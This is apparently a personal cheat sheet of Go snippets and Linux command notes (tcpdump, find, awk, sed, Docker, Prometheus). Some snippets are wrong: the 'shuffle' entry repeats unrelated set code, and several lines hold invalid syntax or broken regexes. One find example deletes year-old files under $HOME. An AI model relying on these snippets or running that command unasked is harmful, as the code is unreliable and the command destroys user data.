go
==================================================
Get executable dir
(tags: executable dir)
---

ex, err := os.Executable()
dir := filepath.Dir(ex)
fmt.Println("dir:", dir)
==================================================
Extract beginning of string (prefix)
(tags: extract beginning string prefix)
---

t := string([]rune(s)[:5])
==================================================
Extract string suffix
(tags: extract string suffix)
---

t := string([]rune(s)[len([]rune(s))-5:])
==================================================
Exec other program
(tags: exec program)
---

err := exec.Command("program", "arg1", "arg2").Run()
==================================================
Telegram message markdown
(tags: telegram message markdown)
---

*полужирный*
_курсив_
[ссылка](http://www.example.com/)
`строчный моноширинный`
```text
блочный моноширинный (можно писать код)
```

import "github.com/go-telegram-bot-api/telegram-bot-api"

msg := tgbotapi.NewMessage(update.Message.Chat.ID, update.Message.Text)
msg.ParseMode = "markdown" //msg.ParseMode = tgbotapi.ModeMarkdown"
==================================================
Telegram message html
(tags: telegram message html)
---

<b>полужирный</b>, <strong>полужирный</strong>
<i>курсив</i>
<a href="http://www.example.com/">ссылка</a>
<code>строчный моноширинный</code>
<pre>блочный моноширинный (можно писать код)</pre>

import "github.com/go-telegram-bot-api/telegram-bot-api"

msg := tgbotapi.NewMessage(update.Message.Chat.ID, update.Message.Text)
msg.ParseMode = "HTML" //msg.ParseMode = tgbotapi.ModeHTML
==================================================
Iterate over map entries ordered by keys
(tags: iterate map order key)
---

keys := make([]string, 0, len(mymap))
for k := range mymap {
  keys = append(keys, k)
}
sort.Strings(keys)
for _, k := range keys {
  x := mymap[k]
  fmt.Println("Key =", k, ", Value =", x)
}

==================================================
Iterate over map entries ordered by values
(tags: iterate map order value)
---

type entry struct {
  key   string
  value int
}
entries := make([]entry, 0, len(mymap))
for k, x := range mymap {
  entries = append(entries, entry{key: k, value: x})
}
sort.Slice(entries, func(i, j int) bool {
  return entries[i].value < entries[j].value
})
for _, e := range entries {
  fmt.Println("Key =", e.key, ", Value =", e.value)
}
==================================================
Slice to set
(tags: slice set)
---

y := make(map[T]struct{}, len(x))
for _, v := range x {
  y[v] = struct{}{}
}
==================================================
Deduplicate slice
(tags: deduplicate slice remove duplicate)
---

seen := make(map[T]bool)
j := 0
for _, v := range x {
  if !seen[v] {
    x[j] = v
    j++
    seen[v] = true
  }
}
for i := j; i < len(x); i++ {
  x[i] = nil
}
x = x[:j]
==================================================
Shuffle a slice
(tags: slice shuffle)
---

y := make(map[T]struct{}, len(x))
for _, v := range x {
  y[v] = struct{}{}
}
==================================================
Sort slice asc
(tags: sort slice asc)
---

sort.Slice(items, func(i, j int) bool {
  return items[i].p < items[j].p
})
==================================================
Sort slice desc
(tags: sort slice desc)
---

sort.Slice(items, func(i, j int) bool {
  return items[i].p > items[j].p
})
==================================================
Remove item from slice by index
(tags: remove item slice index)
---

items = append(items[:i], items[i+1:]...)
==================================================
Graph with adjacency lists
(tags: graph struct)
---

type Vertex struct{
  Id int
  Label string
  Neighbours map[*Vertex]bool
}
type Graph []*Vertex
==================================================
Reverse a string
(tags: string reverse)
---

runes := []rune(s)
for i, j := 0, len(runes)-1; i < j; i, j = i+1, j-1 {
   runes[i], runes[j] = runes[j], runes[i]
}
t := string(runes)
==================================================
Insert item in slice
(tags: insert item slice)
---

s = append(s, 0)
copy(s[i+1:], s[i:])
s[i] = x
==================================================
Filter slice
(tags: filter slice)
---

y := make([]T, 0, len(x))
for _, v := range x{
  if p(v){
    y = append(y, v)
  }
}
==================================================
File content to string
(tags: file content string)
---

b, err := ioutil.ReadFile(f)
lines := string(b)
==================================================
Write to std error
(tags: write std error)
---

fmt.Fprintln(os.Stderr, x, "is negative")
==================================================
Big int
(tags: big integer)
---

x := new(big.Int)
x.Exp(big.NewInt(3), big.NewInt(247), nil)
==================================================
Round float to int
(tags: round float int)
---

y := int(math.Floor(x + 0.5))
==================================================
Check if int addition will overflow
(tags: check int add overflow)
---

func willAddOverflow(a, b int64) bool {
  return a > math.MaxInt64 - b
}
==================================================
Check if int multiplication will overflow
(tags: check int multiply overflow)
---

func multiplyWillOverflow(x, y uint64) bool {
  if x <= 1 || y <= 1 {
    return false
  }
  d := x * y
  return d/y != x
}
==================================================
Load json file into struct
(tags: load json file struct)
---

buffer, err := ioutil.ReadFile("data.json")
err = json.Unmarshal(buffer, &x)
==================================================
Load yaml file into struct
(tags: load yaml file struct)
---

import "gopkg.in/yaml.v3"

buffer, err := ioutil.ReadFile("data.yaml")
err = yaml.Unmarshal(buffer, &x)
==================================================
Save struct into json file
(tags: save struct json file)
---

buffer, err := json.MarshalIndent(x, "", "  ")
err = ioutil.WriteFile("data.json", buffer, 0644)
==================================================
Print type of variable
(tags: print type variable)
---

fmt.Printf("%T", x) //fmt.Println(reflect.TypeOf(x))
==================================================
Load from HTTP GET request into a string
(tags: load http get string)
---

res, err := http.Get(u)
buffer, err := ioutil.ReadAll(res.Body)
res.Body.Close()
s := string(buffer)
==================================================
Read int from stdin
(tags: read int std in)
---

_, err := fmt.Scan(&n)
==================================================
UDP listen and read
(tags: udp listen read)
---

ServerAddr,err := net.ResolveUDPAddr("udp",p)
ServerConn, err := net.ListenUDP("udp", ServerAddr)
defer ServerConn.Close()
n,addr,err := ServerConn.ReadFromUDP(b[:1024])
if n<1024 {
    return fmt.Errorf("Only %d bytes could be read.", n)
}
==================================================
Binary search in sorted slice
(tags: binary search slice)
---

func binarySearch(a []T, x T) int {
    imin, imax := 0, len(a)-1
    for imin <= imax {
        imid := (imin + imax) / 2
        switch {
        case a[imid] == x:
        return imid
        case a[imid] < x:
        imin = imid + 1
        default:
        imax = imid - 1
        }
    }
    return -1
}
==================================================
Measure func call duration
(tags: measure func call duration time)
---

t := time.Now()
foo()
fmt.Printf("%dns\n", time.Since(t).Nanoseconds())

or

t1 := time.Now()
foo()
t := time.Since(t1)
ns := t.Nanoseconds()
fmt.Printf("%dns\n", ns)

or

func Duration(invocation time.Time, name string) {
  elapsed := time.Since(invocation)
  log.Printf("%s lasted %s", name, elapsed)
}
func BigIntFactorial(x big.Int) *big.Int {
  defer profile.Duration(time.Now(), "IntFactorial")

  y := big.NewInt(1)
  for one := big.NewInt(1); x.Sign() > 0; x.Sub(x, one) {
    y.Mul(y, x)
  }
  return x.Set(y)
}
==================================================
Breadth-first traversing in a graph
(tags: bfs traversing graph)
---

func (start *Vertex) Bfs(f func(*Vertex)) {
    queue := []*Vertex{start}
    seen := map[*Vertex]bool{start: true}
    for len(queue) > 0 {
        v := queue[0]
        queue = queue[1:]
        f(v)
        for next, isEdge := range v.Neighbours {
            if isEdge && !seen[next] {
                queue = append(queue, next)
                seen[next] = true
            }
        }
    }
}
==================================================
Depth-first traversing in a graph
(tags: dfs traversing graph)
---

func (v *Vertex) Dfs(f func(*Vertex), seen map[*Vertex]bool) {
    seen[v] = true
    f(v)
    for next, isEdge := range v.Neighbours {
        if isEdge && !seen[next] {
            next.Dfs(f, seen)
        }
    }
}
==================================================
Check if string contains only digits
(tags: check string contains only digits)
---

isNotDigit := func(c rune) bool { return c < '0' || c > '9' }
b := strings.IndexFunc(s, isNotDigit) == -1")
==================================================
Check if file exists
(tags: check file exist)
---

_, err := os.Stat(fp)
b := !os.IsNotExist(err)
==================================================
Read slice of int from stdin
(tags: read slice int std in)
---

var ints []int
s := bufio.NewScanner(os.Stdin)
for s.Scan() {
    i, err := strconv.Atoi(s.Text())
    if err == nil {
        ints = append(ints, i)
    }
}
==================================================
Detect if 32-bit or 64-bit architecture
(tags: detect 32 64 architecture)
---

if strconv.IntSize==32 {
    f32()
}
if strconv.IntSize==64 {
    f64()
}
==================================================
Parse flags
(tags: parse flags args)
---

var b = flag.Bool("b", false, "Do bat")
func main() {
    flag.Parse()
    if *b {
        bar()
    }
}
==================================================
Open URL in default browser
(tags: open url default browser)
---

func openbrowser(url string) {
    var err error
    switch runtime.GOOS {
    case "linux":
        err = exec.Command("xdg-open", url).Start()
    case "windows":
        err = exec.Command("rundll32", "url.dll,FileProtocolHandler", url).Start()
    case "darwin":
        err = exec.Command("open", url).Start()
    default:
        err = fmt.Errorf("unsupported platform")
    }
    if err != nil {
        log.Fatal(err)
    }
}
==================================================
Concatenate two slices
(tags: concat two slice)
---

ab := append(a, b...)
==================================================
String length
(tags: string length)
---

n := utf8.RuneCountInString(s)
==================================================
Make HTTP POST request
(tags: make http post request)
---

response, err := http.Post(u, contentType, body)
==================================================
Bytes to hex string
(tags: byte hex string)
---

s := hex.EncodeToString(a)
==================================================
Hex string to byte array
(tags: byte hex string)
---

a, err := hex.DecodeString(s)
==================================================
Find files with a given list of filename extensions
(tags: file extension walk)
---

L := []string{}
err := filepath.Walk(D, func(path string, info os.FileInfo, err error) error {
    if err != nil {
        fmt.Printf("failure accessing a path %q: %v\n", path, err)
        return err
    }
    for _, ext := range []string{".jpg", ".jpeg", ".png"} {
        if strings.HasSuffix(path, ext) {
            L = append(L, path)
            break
        }
    }
    return nil
})

==================================================
Check if point is inside rectangle
(tags: check point inside rect)
---

p := image.Pt(x, y)
r := image.Rect(x1, y1, x2, y2)
b := p.In(r)
==================================================
List files in directory
(tags: list file dir)
---

x, err := ioutil.ReadDir(d)
==================================================
Make HTTP PUT request
(tags: make http put request)
---

req, err := http.NewRequest("PUT", u, body)
req.Header.Set("Content-Type", contentType)
req.ContentLength = contentLength
response, err := http.DefaultClient.Do(req)
==================================================
Execute function in 30 seconds
(tags: exec func after time)
---

timer := time.AfterFunc(
    30*time.Second,
    func() {
        f(42)
    })
==================================================
Matrix multiplication
(tags: matrix multiply)
---

c := new(mat.Dense)
c.Mul(a, b)
==================================================
Filter and transform slice
(tags: filter transform slice)
---

var y []Result
for _, e := range x {
    if P(e) {
        y = append(y, T(e))
    }
}
==================================================
Get an environment variable
(tags: env var)
---

foo, ok := os.LookupEnv("FOO")
if !ok {
    foo = "none"
}
==================================================
Create folder
(tags: create folder dir)
---

err := os.MkdirAll(path, os.ModeDir)
==================================================
Pad string on the right
(tags: pad string right)
---

if n := utf8.RuneCountInString(s); n < m {
    s += strings.Repeat(c, m-n)
}
==================================================
Pad string on the left
(tags: pad string left)
---

if n := utf8.RuneCountInString(s); n < m {
    s = strings.Repeat(c, m-n) + s
}
==================================================
Progress bar
(tags: progress bar)
---

func printProgressBar(n int, total int) {
    var bar []string
    tantPerFourty := int((float64(n) / float64(total)) * 40)
    tantPerCent := int((float64(n) / float64(total)) * 100)
    for i := 0; i < tantPerFourty; i++ {
        bar = append(bar, "█")
    }
    progressBar := strings.Join(bar, "")
    fmt.Printf("\r " + progressBar + " - " + strconv.Itoa(tantPerCent) + "")
}
==================================================
Create a zip archive
(tags: create zip archive)
---

buf := new(bytes.Buffer)
w := zip.NewWriter(buf)
for _, filename := range list {
    input, err := os.Open(filename)
    output, err := w.Create(filename)
    _, err = io.Copy(output, input)
}
err := w.Close()
err = ioutil.WriteFile(name, buf.Bytes(), 0777)
==================================================
Slice intersection
(tags: slice intersection)
---

seta := make(map[T]bool, len(a))
for _, x := range a {
    seta[x] = true
}
setb := make(map[T]bool, len(a))
for _, y := range b {
    setb[y] = true
}

var c []T
for x := range seta {
    if setb[x] {
        c = append(c, x)
    }
}
==================================================
Replace multiple spaces with single space
(tags: replace space)
---

whitespaces := regexp.MustCompile('\\s+')
t := whitespaces.ReplaceAllString(s, " ")
==================================================
Create a tuple value
(tags: create tuple interface)
---

t := []interface{}{
    2.5,
    "hello",
    make(chan int),
}
==================================================
Remove all non-digits chars
(tags: remove digit char)
---

re := regexp.MustCompile("[^\\\\d]")
t := re.ReplaceAllLiteralString(s, "")
==================================================
Add element to the beginning of the slice
(tags: add beginning slice)
---

items = append([]T{x}, items...)
==================================================
Copy slice
(tags: copy slice)
---

y := make([]T, len(x))
copy(y, x)
==================================================
Copy file
(tags: copy file)
---

func copy(dst, src string) error {
    data, err := ioutil.ReadFile(src)
    stat, err := os.Stat(src)
    return ioutil.WriteFile(dst, data, stat.Mode())
}
==================================================
Cancel an operation
(tags: cancel operation func)
---

ctx, cancel := context.WithCancel(context.Background())
go p(ctx)
somethingElse()
cancel()
==================================================
Timeout
(tags: timeout operation func)
---

ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
defer cancel()
p(ctx)
==================================================
Check if bytes are a valid UTF-8 string
(tags: check byte valid utf8)
---

b := utf8.Valid(s)
==================================================
Encode bytes to base64
(tags: encode byte base64)
---

s := base64.StdEncoding.EncodeToString(data)
==================================================
Decode base64
(tags: decode string base64)
---

data, err := base64.StdEncoding.DecodeString(s)
==================================================
Set value on field of structure in map
(tags: set value field struct map)
---

temp := m[key]
temp.SomeField = 42
m[key] = temp
==================================================
Deploy on Heroku
(tags: heroku deploy)
---

Check this:
1. On site heroku/<myappname>/recources web toggle button turn on
2. In code http.ListenAndServe(":" + os.Getenv("PORT"), nil)
3. In root app's dir you have "Procfile" with "web: bin/myapp"
4. File go.mod have "// +heroku goVersion go1.15" above the line "go 1.15"
==================================================
HTTP file server
(tags: http file server)
---

http.Handle("/", http.FileServer(http.Dir(".")))
http.ListenAndServe(":80", nil)
// log.Fatal(http.ListenAndServe(":8080", http.FileServer(http.Dir("/usr/share/doc"))))
==================================================
Update major version of package in go.mod
(tags: update major version package mod)
---

// go mod init myapp
// go mod vendor
add version on import github.com/go-telegram-bot-api/telegram-bot-api/v5
or if you want to use the newest commit
go get github.com/go-telegram-bot-api/telegram-bot-api@b6df6c2
go mod tidy
==================================================
Using go mod vendor
(tags: mod vendor)
---

go mod init myapp
go mod vendor
go build -mod=vendor main.go
==================================================
Linux tcpdump
(tags: linux tcpdump)
---

// output format
[Timestamp] [Protocol] [Src IP].[Src Port] > [Dst IP].[Dst Port]: [Flags], [Seq], [Ack], [Win Size], [Options], [Data Length]
// show available interfaces
tcpdump -D
// catch all packets
tcpdump -i any
// catch first 5 packets
tcpdump -i any -c 5
// do not resolve ip (-n) and ports (-nn)
tcpdump -i any -c5 -nn
// filter by icmp packets
tcpdump -i any -c5 icmp
// filter packets by a special host
tcpdump -i any -c5 -nn host 54.204.39.132
// filer packets by subnet
tcpdump -n net 192.168.1
// filter by port
tcpdump -i any -c5 -nn port 80
// filter by ports
tcpdump -n portrange 11128-11142
// filter by destination
tcpdump -i any -c5 -nn dst 192.168.122.98
// complexly
tcpdump -i any -c5 -nn src 192.168.122.98 and port 80
tcpdump -i any -c5 -nn "port 80 and (src 192.168.122.98 or src 54.204.39.132)"
// print packet content in ascii (-A) or hex (-X)
tcpdump -i any -c10 -nn -A port 80
// save result in file
tcpdump -i any -c10 -nn -w webserver.pcap port 80
// read result from file (you may use wireshark)
tcpdump -nn -r webserver.pcap
tcpdump -nn -r webserver.pcap src 54.204.39.132
==================================================
Linux info
(tags: linux info)
---

id      // info about your account
w       // who there are in the system now
lscpu   // info about processors
lsof    // list of open files
free    // info about memory
cat     // show content of the file
less    // show file in fragments
more    // for big files
tail -f // show end of file in interactive
cmp     // compare files by bytes
comm    // show sort files string by string
diff    // show diff between files
grep    // find in text by regexp
find    // find files
wc      // words count

https://opensource.com/article/20/12/linux-server

uname -a    // full user info
hostnamectl // server info (virtual or not)
uptime      // working time
who -Hu     // user info
dmidecode -s system-product-name // virtual or not
pstree       // processes info
pstree -pa 1 //
ps -ef
ps auxf
systemctl
netstat -tulpn // network connections
netstat -anp
lsof -i
ss
iptables -L -n
cat /etc/resolv.conf
uname -r          // kernel
cat /proc/cmdline
lsmod
modinfo <module>
sysctl -a
cat /boot/grub2/grub.cfg
dmesg      // logs
journalctl
==================================================
Linux bash hotkeys
(tags: linux bash hotkeys)
---

alt+b  // move cursor to the start of word (back)
alt+f  // move to the end of word (forward)
ctrl+a // move to the start
ctrl+e // move to the end
ctrl+]<char> // move right to first <char> entry
ctrl+alt+]<char> // move left to <char>
ctrl+w // remove word before the cursor
alt+d  // remove word after
ctrl+u // remove all before cursor
ctrl+k // remove all after cursor
ctrl+y // return removed
!! // repeat last command
!$ // "cat a.txt" then "less !$" = "less a.txt"
!* // "head a.txt | grep '^Al'" then "tail !*"
alt+. // insert last arg from previous command
alt+<N>+alt+. // insert <N> arg from previous command
>a.txt // creat file or clean it
ctrl+l // clean terminal
ctrl+r // show history
ctrl+d // exit
==================================================
Linux std
(tags: linux std in out err)
---

> send to stream
< get from straem
>> append to stream
<< join stream
// send stdout to out.txt, stderr to err.txt
./myapp > out.txt 2> err.txt
// send stdout and stderr in outerr.txt
./myapp > outerr.txt 2>&1 ac -pd &> outerr.txt
// skip stdout and stderr
./myapp &> /dev/null
// stdout as arg
diff <(ls dirA) <(ls dirB)
// create files with names from list
xargs touch < list.txt
==================================================
Linux find
(tags: linux find)
---

find /opt -name "README*" -exec wc -l {} +
// criteria:
-name,  -iname, -type (f, d, l), -inum <Н>, -not-name
-user<uname>, -group<gname>,  -perm (ugo+/-rwx)
-size +x[c], -empty, -newer <fname>
-atime +x, -amin +x, -mmin -x, -mtime -x
-and (-a), or (-o)
-~ (hiden files), -perm (permissions)
// actions:
-print — default print
-ls — exec ls -lids for every result file
-exec cmd — exec command
-ok cmd — exec command after user confirmation
// examples:
find . -type f -iname "*.txt" — xt-files in curdir
find . -maxdepth 1 — equivalent ls
find ./somedir -type f -size +512M -print — all files large then 512M in ./somedir
find /usr/bin ! -type l — no symbol link in /usr/bin
find $HOME -type f -atime +365 -exec rm {} + — remove all files that have not been available for a year
find . \( -name "*.c" -o -name "*.h" \) — all files with .c or .h extention
==================================================
Linux grep
(tags: linux grep)
---

grep -i -n 'c.l' states.txt
// print number of string whoes start with t
printf "one\ntwo\nthree\nfour\nfive" | grep -n '^t'
  2:two
  3:three
// options:
-i: ignore case
-n: print string number with strings
-v: invert - print that not matched
-c: print count of matched strings
-A<n>: print <n> strings after
-B<n>: print <n> strings before
-o: print only matched, not whole string
-E: allowed to use extention regexp
-r: recurcive in dirs
-w: find word
-l: print with file names
--color: colorise print
==================================================
Linux awk
(tags: linux awk)
---

// $0 - all string, $1 - first word, $2 - second...
echo "I'm Tom" | awk '{$2="Bill"; print $0}'
  I'm Bill
printf "12\n32\n54\n6" | awk '{if ($1>20) print $1}'
  32
  54
// use function
printf "first a\nsecond b\nthird c" | awk '{print(toupper($1))}' >&1
  FIRST
  SECOND
  THIRD
// set other word delimeter
printf "first:a\nsecond:b\nthird:c" | awk 'BEGIN{FS=":"}{print(toupper($1))}' >&1
printf "first:a\nsecond:b\nthird:c" | awk -F: '{print(toupper($1))}' >&1
  FIRST
  SECOND
  THIRD
// print last field
printf "a b c d e f" | awk '{print(toupper($NF))}' >&1
  f
// set other string delimeter and use filter
printf "1a 1b 2c 2d 3e 3f" | awk 'BEGIN{RS=" "}{print(toupper($NF))}' | awk '/2/{print $0}'
  2C
  2D
// use variables
echo -e 'one 1\n two 2' | awk '{sum+=$2}END{print sum}'
  3
// sum of values in last column in file
< requests.log awk '{totalBytes+=$NF}END{print totalBytes}'
// substr function (printf(string), system(command), length(string))
printf "1a 1b" | awk 'BEGIN{RS=" "}{print(substr($1,2,1))}'
  a
  b
==================================================
Linux sed
(tags: linux sed)
---

// print 2-4 strings from file, show only result (-n)
printf "one\ntwo\nthree\nfour\nfive" | sed -n '2,4p'
  two
  three
  four
// print without 1-2 strings
printf "one\ntwo\nthree\nfour\nfive" | sed '1,2d'
  three
  four
  five
// replace words
printf "one\ntwo\nthree" | sed 's/tw/TW/g'
  one
  TWo
  three
// replace chars
printf "one\ntwo\nthree" | sed 'y/t/T/'
  one
  Two
  Three
// append string
  printf "one\ntwo" | sed 'a-----'
  one
  -----
  two
  -----
==================================================
Compile for android
(tags: compile android)
---

env GOOS=android GOARCH=arm64 go build main.go
==================================================
Cli tool
(tags: cli tool)
---

import "github.com/urfave/cli/v2"

func main() {
  var language string
  app := &cli.App{
    Flags: []cli.Flag {
      &cli.StringFlag{
        Name:        "lang",
        Aliases:     []string{"l"},
        Value:       "english",
        Usage:       "language for the greeting",
        Destination: &language,
      },
    },
    Action: func(c *cli.Context) error {
      name := "someone"
      if c.NArg() > 0 {
        name = c.Args().Get(0)
      }
      if language == "spanish" {
        fmt.Println("Hola", name)
      } else {
        fmt.Println("Hello", name)
      }
      return nil
    },
  }
  err := app.Run(os.Args)
  if err != nil {
    log.Fatal(err)
  }
}
// Action: act, where func act(c *cli.Context) error - working!
// Action: act, where func act(language stribg) func (c *cli.Context) error - do not working, var is empty!
==================================================
Linux tree
(tags: linux tree)
---

// print only dir with low than 26 files
tree -d --filelimit 26
// print hiden dir, sort by depth, show modify date
tree -avD
// print files that matched template, do not show dir that gave not needed files
tree -P '*.pdf' --pruneupdate
// write three with dir into a file
tree -d -o tree_command_results.txt
// print size, user, permissions, full path
tree -hupf
==================================================
Build go app in docker from scratch
(tags: docker build scratch)
---

FROM golang AS builder
ADD . /app
WORKDIR /app
RUN CGO_ENABLED=0 go build -mod=vendor -ldflags '-extldflags "-static"' -o kit

FROM scratch
COPY --from=builder /app/kit /app/kit
EXPOSE 8080 8080
ENTRYPOINT ["/app/kit"]
==================================================
Use prometheus and grafana
(tags: docker prometheus grafana compose)
---

// Dockerfile
FROM golang AS builder
ADD . /app
WORKDIR /app
RUN CGO_ENABLED=0 go build -mod=vendor -ldflags '-extldflags "-static"' -o kit

FROM scratch
COPY --from=builder /app/kit /app/kit
EXPOSE 8080 8080
ENTRYPOINT ["/app/kit"]

// prometheus/prometheus.yml
scrape_configs:
  - job_name: my_group
    scrape_interval: 10s
    static_configs:
      - targets:
          - kit:8080

// docker-compose.yaml
version: "3"

services:
  kit:
    build:
      context: .
      dockerfile: Dockerfile
    ports:
      - 8080:8080

  grafana:
    image: grafana/grafana
    container_name: grafana
    ports:
      - 3000:3000

  prometheus:
    image: prom/prometheus
    container_name: prometheus
#    restart: unless-stopped
    ports:
      - 9090:9090
    volumes:
      - ./prometheus/prometheus.yml:/etc/prometheus/prometheus.yml

// docker-compose up
==================================================
Simple metrics for prometheus
(tags: metrics prometheus)
---

import (
  "github.com/prometheus/client_golang/prometheus"
  "github.com/prometheus/client_golang/prometheus/promauto"
  "github.com/prometheus/client_golang/prometheus/promhttp"
)

func recordMetrics() {
  go func() {
    for {
      opsProcessed.Inc()
      time.Sleep(2 * time.Second)
    }
  }()
}

var opsProcessed = promauto.NewCounter(prometheus.CounterOpts{
    Name: "myapp_processed_ops_total",
    Help: "The total number of processed events",
  })

func main() {
  recordMetrics()
  http.Handle("/metrics", promhttp.Handler())
  http.ListenAndServe(":8080", nil)
}
// curl http://localhost:8080/metrics
==================================================
Install golang on android
(tags: install android)
---

1. Install Termux from Play Market
2. pkg install golang
3. cd ~
4. mkdir gopath
5. export GOPATH=$HOME/gopath
6. pkg install git
7. go get github.com/gorilla/mux
==================================================
Unsafe for loop
(tags: unsafe for loop)
---

arr := []uint32{1, 2, 3}
const size = unsafe.Sizeof(uint32(0)) //4
for i := 0; i < len(arr); i++ {
  fmt.Printf("%d ",
    *(*uint32)( // conver into (*uint32), then take value - *(*uint32)
      unsafe.Pointer( // get address
        // address 0-element + offset size (4)
        uintptr(unsafe.Pointer(&arr[0])) + (uintptr(i) * size)))) // uintptr(i) for type assign
}
==================================================
Unsafe string to bytes without copy
(tags: unsafe string byte)
---

func string2bytes(s string) []byte {
  stringHeader := (*reflect.StringHeader)(unsafe.Pointer(&s))
  bh := reflect.SliceHeader{
    Data: stringHeader.Data,
    Len:  stringHeader.Len,
    Cap:  stringHeader.Len,
  }
  return *(*[]byte)(unsafe.Pointer(&bh))
}
==================================================
Unsafe bytes to string without copy
(tags: unsafe string byte)
---

func bytes2string(b []byte) string {
  sliceHeader := (*reflect.SliceHeader)(unsafe.Pointer(&b))
  sh := reflect.StringHeader{
    Data: sliceHeader.Data,
    Len:  sliceHeader.Len,
  }
  return *(*string)(unsafe.Pointer(&sh))
}
==================================================
Unsafe change struct fields
(tags: unsafe struct field)
---

type Programmer struct {
  name     string
  language string
}
p := Programmer{"Tom", "en"}
name := (*string)(unsafe.Pointer(&p))
*name = "Foma"
lang := (*string)(unsafe.Pointer(uintptr(unsafe.Pointer(&p)) + unsafe.Offsetof(p.language)))
*lang = "ru"
==================================================
Unsafe change unexported struct fields from other package
(tags: unsafe struct field unexported)
---

p2 := a.Programmer2{}
// cannot refer to unexported field or method name (p2.name = "Foma")
// but we can see in source code what the fields there. First field is string
name2 := (*string)(unsafe.Pointer(&p2))
*name2 = "Foma"
// second field is int. Doing the offset by string size
age2 := (*int)(unsafe.Pointer(uintptr(unsafe.Pointer(&p2)) + unsafe.Sizeof(string(""))))
*age2 = 25
// third field is string
lang2 := (*string)(unsafe.Pointer(uintptr(unsafe.Pointer(&p2)) + unsafe.Sizeof(string("")) + unsafe.Sizeof(int(0))))
*lang2 = "ru"
==================================================
Json marshal infinity float to null
(tags: json marshal float nan infinity)
---

type Measure struct {
  Type  string   `json:"type"`
  Power *float64 `json:"power"`
}

func main() {
  val := math.Inf(1)
  power := &val
  if math.IsInf(val, 0) {
    power = nil
  }
  m := Measure{
    Type: "simple",
    Power: power,
  }
  j, _ := json.Marshal(&m)
  fmt.Println(string(j)) // {"type":"simple","power":null}
}
==================================================
Scan arguments in string by template
(tags: scan arg string)
---

var name string
var age int
n, err := fmt.Sscanf("Joe is 22 years old", "%s is %d years old", &name, &age)
==================================================
Printf formats
(tags: printf print format)
---

var i int
var f float32
var s string
var b bool
var c Car

fmt.Printf("%v\n", i) //0
fmt.Printf("%v\n", f) //0
fmt.Printf("%v\n", s) //
fmt.Printf("%v\n", b) //false
fmt.Printf("%v\n", c) //{ 0}

fmt.Printf("%+v\n", i) //0
fmt.Printf("%+v\n", f) //0
fmt.Printf("%+v\n", s) //
fmt.Printf("%+v\n", b) //false
fmt.Printf("%+v\n", c) //{Model: Speed:0}

fmt.Printf("%#v\n", i) //0
fmt.Printf("%#v\n", f) //0
fmt.Printf("%#v\n", s) //""
fmt.Printf("%#v\n", b) //false
fmt.Printf("%#v\n", c) //main.Car{Model:"", Speed:0}

fmt.Printf("%T\n", i) //int
fmt.Printf("%T\n", f) //float32
fmt.Printf("%T\n", s) //string
fmt.Printf("%T\n", b) //bool
fmt.Printf("%T\n", c) //main.Car

fmt.Printf("%%\n") //%

i = 15
f = 32.7
s = "Pri vet!"
b = true
c = Car{"Audi", 200}

fmt.Printf("%#v\n", i) //15
fmt.Printf("%#v\n", f) //32.7
fmt.Printf("%#v\n", s) //"Pri vet!"
fmt.Printf("%#v\n", b) //true
fmt.Printf("%#v\n", c) //main.Car{Model:"Audi", Speed:200}

fmt.Printf("%b\n", i) //1111
fmt.Printf("%c\n", i) //☼
fmt.Printf("%d\n", i) //15
fmt.Printf("%o\n", i) //17
fmt.Printf("%O\n", i) //0o17
fmt.Printf("%q\n", i) //'\x0f'
fmt.Printf("%x\n", i) //f
fmt.Printf("%X\n", i) //F
fmt.Printf("%U\n", i) //U+000F

fmt.Printf("%b\n", f) //8572109p-18
fmt.Printf("%e\n", f) //3.270000e+01
fmt.Printf("%E\n", f) //3.270000E+01
fmt.Printf("%f\n", f) //32.700001
fmt.Printf("%F\n", f) //32.700001
fmt.Printf("%g\n", f) //32.7
fmt.Printf("%G\n", f) //32.7
fmt.Printf("%x\n", f) //0x1.05999ap+05
fmt.Printf("%X\n", f) //0X1.05999AP+05
fmt.Printf("%9.2f\n", f) //  32.70

fmt.Printf("%s\n", s) //Pri vet!
fmt.Printf("%q\n", s) //"Pri vet!"
fmt.Printf("%q\n", "abc\tdef\n") //"abc\tdef\n"
fmt.Printf("%x\n", s) //5072692076657421
fmt.Printf("%X\n", s) //5072692076657421
fmt.Printf("% X\n", s) //50 72 69 20 76 65 74 21

fmt.Println("\n=== Slice ===")
// pointer on 0-element
fmt.Printf("%p\n", []int{1, 2, 3}) //0x11812274

fmt.Println("\n=== Sprintf ===") //pointer
s1 := fmt.Sprintf("%[3]*.[2]*[1]f", 12.0, 2, 6)
s2 := fmt.Sprintf("%6.2f", 12.0)
fmt.Println(s1, s2) // 12.00  12.00
s3 := fmt.Sprintf("%d %d %#[1]x %#x", 16, 17)
fmt.Println(s3) //16 17 0x10 0x11

// errors:
Wrong type or unknown verb: %!verb(type=value)
  Printf("%d", "hi"):        %!d(string=hi)
Too many arguments: %!(EXTRA type=value)
  Printf("hi", "guys"):      hi%!(EXTRA string=guys)
Too few arguments: %!verb(MISSING)
  Printf("hi%d"):            hi%!d(MISSING)
Non-int for width or precision: %!(BADWIDTH) or %!(BADPREC)
  Printf("%*s", 4.5, "hi"):  %!(BADWIDTH)hi
  Printf("%.*s", 4.5, "hi"): %!(BADPREC)hi
Invalid or invalid use of argument index: %!(BADINDEX)
  Printf("%*[2]d", 7):       %!d(BADINDEX)
  Printf("%.[2]d", 7):       %!d(BADINDEX)
if a String method calls panic("bad"), the resulting formatted message will look like
  %!s(PANIC=bad)
==================================================
Date to string
(tags: date string)
---

fileName := fmt.Sprintf("data_%s.txt", time.Now().Format("20060102_150405"))
==================================================
Pattern Chain of responsibility
(tags: pattern chain responsibility)
---

https://github.com/AlexanderGrom/go-patterns

The Chain Of Responsibility pattern refers to object-level behavioral patterns.

The Chain Of Responsibility pattern avoids binding a requestor object to a request receiver object, while giving multiple objects the chance to process the request. The recipients are chained, and the request is chained until it is processed by some object.

In essence, it is a chain of handlers that receive a request in turn, and then decide whether to process it or not. If the request is not processed, then it is forwarded further along the chain. If it is processed, then the pattern itself decides to pass it on or not. If the request is not processed by any handler, then it is simply lost.

Required for implementation:

1. Basic abstract class Handler, which describes the interface of handlers in chains;
2. The ConcreteHandlerA class, which implements the concrete handler A;
3. The ConcreteHandlerB class, which implements the concrete handler B;
4. The ConcreteHandlerC class, which implements a specific C handler;

Note that instead of storing references to all the candidate recipients of the request, each sender stores a single reference to the beginning of the chain, and each recipient has a single reference to its successor, the subsequent element in the chain.

package chain_of_responsibility

// Handler provides a handler interface.
type Handler interface {
  SendRequest(message int) string
}
